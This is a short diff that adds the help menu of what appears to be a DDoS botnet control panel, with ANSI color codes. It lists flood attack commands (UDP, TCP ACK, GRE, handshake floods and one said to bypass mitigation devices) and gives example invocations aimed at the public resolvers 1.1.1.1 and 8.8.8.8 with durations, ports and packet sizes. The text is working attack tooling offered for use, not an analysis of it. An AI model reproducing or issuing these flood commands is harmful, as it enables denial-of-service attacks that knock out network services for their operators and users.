@@ -1,0 +1,12 @@
+\x1b[0mAttack vectors\x1b[94m:
+ \x1b[94m- \x1b[0m!udpplain\x1b[94m: \x1b[0mUDP socket flood
+ \x1b[94m- \x1b[0m!ack\x1b[94m: \x1b[0mTCP ACK flood
+ \x1b[94m- \x1b[0m!wra\x1b[94m: \x1b[0mTCP WRA flood
+ \x1b[94m- \x1b[0m!stomp\x1b[94m: \x1b[0mTCP handshake + ACK/PSH flood
+ \x1b[94m- \x1b[0m!greip\x1b[94m: \x1b[0mLayer 3 GRE IP flood
+ \x1b[94m- \x1b[0m!handshake\x1b[94m: \x1b[0mTCP 3-way handshake
+ \x1b[94m- \x1b[0m!tcpbypass\x1b[94m: \x1b[0mSimple tcp flood to bypass mitigation devices
+\x1b[0mExamples\x1b[94m:
+ \x1b[94m- \x1b[0m!udpplain 1.1.1.1 15 dport=53 len=1400
+ \x1b[94m- \x1b[0m!udpplain 8.8.8.8 30 minlen=700 maxlen=900
+ \x1b[94m- \x1b[0m!socket 1.1.1.1 15 dport=80 payload=[hexadecimal payload]
